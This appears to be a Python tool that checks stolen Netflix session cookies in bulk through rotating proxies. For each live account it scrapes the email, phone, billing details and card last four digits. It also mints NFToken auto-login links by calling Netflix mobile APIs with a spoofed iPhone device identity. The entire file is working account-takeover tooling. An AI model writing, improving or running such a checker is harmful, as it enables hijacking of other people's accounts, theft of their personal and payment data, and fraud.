# checkers/netflix.py
import re
import json
import random
import time
import os
import threading
import requests
import urllib3
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NetflixChecker:
    # ===== USER AGENTS =====
    UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
    
    # ===== IOS CONFIG =====
    IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    IOS_PARAMS = {
        "appVersion": "15.48.1",
        "config": ('{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false",'
                   '"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true",'
                   '"billboardEnabled":"true","sharksEnabled":"true",'
                   '"useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'),
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }
    IOS_HEADERS = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.argo.abtests": "",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
    }

    @staticmethod
    def _format_proxy(proxy):
        """Formatea el proxy para requests"""
        if not proxy:
            return None
        proxy = proxy.strip()
        if proxy.startswith(("http://", "https://")):
            return proxy
        parts = proxy.split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{proxy}"

    @staticmethod
    def _djs(s):
        """Decodifica strings con caracteres escapados"""
        if not s:
            return ""
        s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
        s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
        return s.strip()

    @staticmethod
    def _rx(pattern, text, default=""):
        """Busca un patrón regex en el texto"""
        m = re.search(pattern, text, re.S)
        return m.group(1) if m else default

    @staticmethod
    def _rx_all(pattern, text):
        """Busca todos los patrones regex en el texto"""
        return re.findall(pattern, text, re.S)

    @staticmethod
    def parse_netscape(text):
        """Parsea cookies en formato Netscape"""
        cookies = {}
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
        return cookies

    @staticmethod
    def parse_json_cookies(text):
        """Parsea cookies en formato JSON"""
        try:
            data = json.loads(text)
            if isinstance(data, list):
                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
            if isinstance(data, dict):
                return data
        except Exception:
            pass
        return {}

    @staticmethod
    def load_cookies(text):
        """Carga cookies de cualquier formato"""
        text = text.strip()
        if text.startswith("[") or text.startswith("{"):
            c = NetflixChecker.parse_json_cookies(text)
            if c:
                return c
        c = NetflixChecker.parse_netscape(text)
        if c:
            return c
        cookies = {}
        for part in re.split(r"[;\n]", text):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                k = k.strip()
                v = v.strip()
                if k:
                    cookies[k] = v
        return cookies

    @staticmethod
    def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
        """Genera NFToken para login automático"""
        if not netflix_id_raw:
            return None

        netflix_id = urllib.parse.unquote(str(netflix_id_raw))
        proxy_url = NetflixChecker._format_proxy(proxy)
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        headers = dict(NetflixChecker.IOS_HEADERS)
        headers["Cookie"] = f"NetflixId={netflix_id}"

        try:
            r = requests.get(
                NetflixChecker.IOS_API,
                params=NetflixChecker.IOS_PARAMS,
                headers=headers,
                proxies=proxies,
                timeout=timeout,
                verify=False,
            )
            if r.status_code == 200:
                data = r.json()
                token_data = (
                    (((data.get("value") or {}).get("account") or {})
                     .get("token") or {})
                    .get("default") or {}
                )
                tok = token_data.get("token")
                if tok:
                    return str(tok)
        except Exception:
            pass

        try:
            sess2 = requests.Session()
            sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
            if proxies:
                sess2.proxies = proxies
                sess2.verify = False
            payload = {
                "operationName": "CreateAutoLoginToken",
                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
                "extensions": {
                    "persistedQuery": {
                        "version": 102,
                        "id": "76e97129-f4b5-41a0-a73c-12e674896849",
                    }
                },
            }
            r2 = sess2.post(
                "https://android13.prod.ftl.netflix.com/graphql",
                json=payload,
                headers={
                    "User-Agent": NetflixChecker.UA_ANDROID,
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                },
                timeout=timeout,
            )
            if r2.status_code == 200:
                d = r2.json()
                tok = (d.get("data") or {}).get("createAutoLoginToken")
                if tok:
                    return str(tok)
        except Exception:
            pass

        return None

    @staticmethod
    def check_account(cookies: dict, proxy=None, timeout=20):
        """Verifica la cuenta con cookies"""
        if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
            return None

        proxy_url = NetflixChecker._format_proxy(proxy)
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        sess = requests.Session()
        sess.headers.update({
            "User-Agent": NetflixChecker.UA_WEB,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "DNT": "1",
        })
        for k, v in cookies.items():
            sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
        if proxies:
            sess.proxies = proxies
            sess.verify = False

        try:
            r = sess.get(
                "https://www.netflix.com/account",
                allow_redirects=True,
                timeout=timeout,
            )
        except requests.RequestException:
            return None

        if "login" in r.url.lower() or r.status_code in (401, 403):
            return None

        html = r.text

        if '"membershipStatus":"CURRENT_MEMBER"' not in html:
            return None

        email = NetflixChecker._djs(NetflixChecker._rx(r'"emailAddress":"([^"]+)"', html))

        name = NetflixChecker._djs(NetflixChecker._rx(r'"userInfo":\{"name":"([^"]+)"', html))
        if not name:
            name = NetflixChecker._djs(NetflixChecker._rx(r'"firstName":"([^"]+)"', html))

        cc = NetflixChecker._rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")

        since = NetflixChecker._djs(NetflixChecker._rx(r'"memberSince":"([^"]+)"', html))
        if not since:
            ts_raw = NetflixChecker._rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
            if ts_raw and ts_raw.isdigit():
                try:
                    since = datetime.utcfromtimestamp(int(ts_raw) / 1000).strftime("%B %Y")
                except Exception:
                    since = "N/A"

        plan = NetflixChecker._djs(NetflixChecker._rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))

        plan_id = NetflixChecker._rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)

        price = NetflixChecker._djs(NetflixChecker._rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))

        q_raw = NetflixChecker._rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
        quality_map = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}
        quality = quality_map.get(q_raw, q_raw or "N/A")

        streams = NetflixChecker._rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")

        nextbill = NetflixChecker._djs(NetflixChecker._rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))

        _pm_start = html.find('"paymentMethods"')
        pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
        card_brand = NetflixChecker._rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
        if not card_brand:
            card_brand = NetflixChecker._rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
        pay_type = NetflixChecker._rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
        card_last4 = NetflixChecker._rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
        if not card_last4:
            card_last4 = NetflixChecker._rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)

        phone = NetflixChecker._djs(NetflixChecker._rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"

        pv_raw = NetflixChecker._rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
        phone_verified = pv_raw == "true"

        extra_raw = NetflixChecker._rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
        extra_slots = int(extra_raw) if extra_raw.isdigit() else 0

        can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html

        free_trial = '"isInFreeTrial":true' in html

        profiles = [NetflixChecker._djs(p) for p in NetflixChecker._rx_all(r'"profileName":"([^"]+)"', html)]
        if not profiles:
            profiles = [NetflixChecker._djs(p) for p in NetflixChecker._rx_all(
                r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
        seen = set()
        profiles_clean = []
        for p in profiles:
            if p and p not in seen:
                seen.add(p)
                profiles_clean.append(p)

        user_guid = NetflixChecker._rx(r'"userGuid":"([^"]+)"', html)

        netflix_id_raw = cookies.get("NetflixId", "")
        tok = NetflixChecker.generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
        if tok:
            tok_safe = urllib.parse.quote(tok, safe="")
            login_pc = f"https://netflix.com/?nftoken={tok_safe}"
            login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
        else:
            login_pc = "N/A"
            login_phone = "N/A"
        login_tv = "https://www.netflix.com/tv2"

        display_name = name or (profiles_clean[0] if profiles_clean else "N/A")

        return {
            "email": email or "N/A",
            "name": display_name,
            "country_code": cc,
            "country": cc,
            "plan": plan or "N/A",
            "plan_id": plan_id or "N/A",
            "price": price or "N/A",
            "member_since": since or "N/A",
            "next_billing": nextbill or "N/A",
            "free_trial": free_trial,
            "can_change": can_change,
            "video_quality": quality,
            "max_streams": str(streams),
            "extra_slots": extra_slots,
            "card_brand": card_brand or "N/A",
            "card_last4": card_last4 or "N/A",
            "payment_method": pay_type or "N/A",
            "phone": phone,
            "phone_verified": phone_verified,
            "profiles": profiles_clean,
            "profile_count": len(profiles_clean),
            "user_guid": user_guid or "N/A",
            "netflix_id_raw": netflix_id_raw,
            "login_pc": login_pc,
            "login_phone": login_phone,
            "login_tv": login_tv,
        }

    @staticmethod
    def check(cookie_text: str, proxy: str = None) -> dict:
        """Verifica una cuenta de Netflix a partir de texto de cookies"""
        cookies = NetflixChecker.load_cookies(cookie_text)
        if not cookies:
            return {"status": "ERROR", "error": "No se pudieron parsear las cookies"}

        result = NetflixChecker.check_account(cookies, proxy=proxy, timeout=20)

        if not result:
            return {"status": "INVALID", "message": "Cookies inválidas o expiradas"}

        result["status"] = "HIT"
        result["is_premium"] = True
        return result

    @staticmethod
    def process_batch(cookie_files: list, proxies: list = None, threads: int = 5) -> list:
        """Procesa un lote de archivos de cookies con threads"""
        results = []
        stats = {"hit": 0, "bad": 0, "error": 0, "total": len(cookie_files)}

        proxy_index = 0
        proxy_lock = threading.Lock()
        result_lock = threading.Lock()

        def get_next_proxy():
            nonlocal proxy_index
            if not proxies:
                return None
            with proxy_lock:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                return proxy

        def process_file(filepath):
            proxy = get_next_proxy()
            try:
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    raw = f.read()
                result = NetflixChecker.check(raw, proxy)
                result["source"] = os.path.basename(filepath)
                return result
            except Exception as e:
                return {"status": "ERROR", "source": os.path.basename(filepath), "error": str(e)}

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(process_file, fp): fp for fp in cookie_files}
            for future in as_completed(futures):
                result = future.result()
                with result_lock:
                    results.append(result)
                    if result.get("status") == "HIT":
                        stats["hit"] += 1
                    elif result.get("status") == "INVALID":
                        stats["bad"] += 1
                    else:
                        stats["error"] += 1

        return results, stats